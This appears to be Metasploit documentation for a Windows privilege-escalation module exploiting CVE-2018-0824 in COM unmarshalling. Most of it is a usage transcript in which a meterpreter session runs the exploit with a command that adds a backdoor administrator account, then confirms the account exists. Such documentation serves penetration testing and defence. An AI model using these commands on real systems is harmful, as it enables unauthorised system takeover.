## Overview
This is a post exploitation module for local privilege escalation bug which exists in Microsoft COM for windows when it fails to properly handle serialized objects.

* https://www.phpmyadmin.net/downloads/
* https://github.com/codewhitesec/UnmarshalPwn/
* https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0824

## Module Options

"POCCMD" This command will be executed on successful exploitation.</br>
"SESSION" The session to run this module on.

## Limitations

The payload will not spawn ant independent session it simply creates process with the system privilege.
If the system is not vulnerable, then payload will execute but new process will not spawn.

## Verification steps

If you want to confirm the vulnerability before you add user or perform any other sensitive action. 

1. `set POCCMD /s notepad.exe` 
2. `run` 

Confirmation:

Then go to meterpreter session and confirm running process (ps)
If you see notepad.exe running as SYSYEM then that is as indication of vulnerable system.

## Usage

```
meterpreter > getuid
Server username: PC2\test
meterpreter > sysinfo 
Computer        : PC2
OS              : Windows 10 (Build 17134).
Architecture    : x64
System Language : en_US
Domain          : PSS
Logged On Users : 12
Meterpreter     : x64/windows
meterpreter > background 
[*] Backgrounding session 2...

msf > use post/windows/escalate/unmarshal 
msf post(windows/escalate/unmarshal) > show options 

Module options (post/windows/escalate/unmarshal):

 Name              Current Setting                                                       
 ----              ---------------                                                                        
POCCMD  /k net user msfuser msfpass /add && net localgroup administrators msf /add
READFILE             c:\boot.ini    
SESSION                   



msf post(windows/escalate/unmarshal) > set session 2


msf post(windows/escalate/unmarshal) > run

[!] SESSION may not be compatible with this module.
[*] exe name is: oQT0yWT834.exe
[*] poc name is: sJ76Il3UGj.sct
[*] Reading Payload from file /usr/share/metasploit-framework/data/exploits/CVE-2018-0824/UnmarshalPwn.exe
[!] writing to %TEMP%
[+] Persistent Script written to C:\Users\test\AppData\Local\Temp\oQT0yWT834.exe
[*] Reading Payload from file /usr/share/metasploit-framework/data/exploits/CVE-2018-0824/poc_header
[!] writing to %TEMP%
[+] Persistent Script written to C:\Users\test\AppData\Local\Temp\sJ76Il3UGj.sct
[*] Reading Payload from file /usr/share/metasploit-framework/data/exploits/CVE-2018-0824/poc_footer
[*] Starting module...

[*] Location of UnmarshalPwn.exe is: C:\Users\test\AppData\Local\Temp\oQT0yWT834.exe
[*] Location of poc.sct is: C:\Users\test\AppData\Local\Temp\sJ76Il3UGj.sct
[*] Executing command : C:\Users\test\AppData\Local\Temp\oQT0yWT834.exe C:\Users\test\AppData\Local\Temp\sJ76Il3UGj.sct
Query for IStorage
Call:  Stat
End:  Stat
Query for IMarshal
Call:  GetMarshalSizeMax
Unknown IID: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 0000020CA320CDB0
Query for IMarshal
Call:  GetUnmarshalClass
Call:  GetMarshalSizeMax
Call:  MarshalInterface

[*] Post module execution completed


Confirmation 
Back in Meterpreter Session 

meterpreter > shell 
Process 3936 created.
Channel 185 created.
Microsoft Windows [Version 10.0.17134.1]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\temp\un>net user
net user

User accounts for \\PC2

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
User                   msfuser                  sshd                     
sshd_server              test                     WDAGUtilityAccount       
The command completed successfully.                                                                        
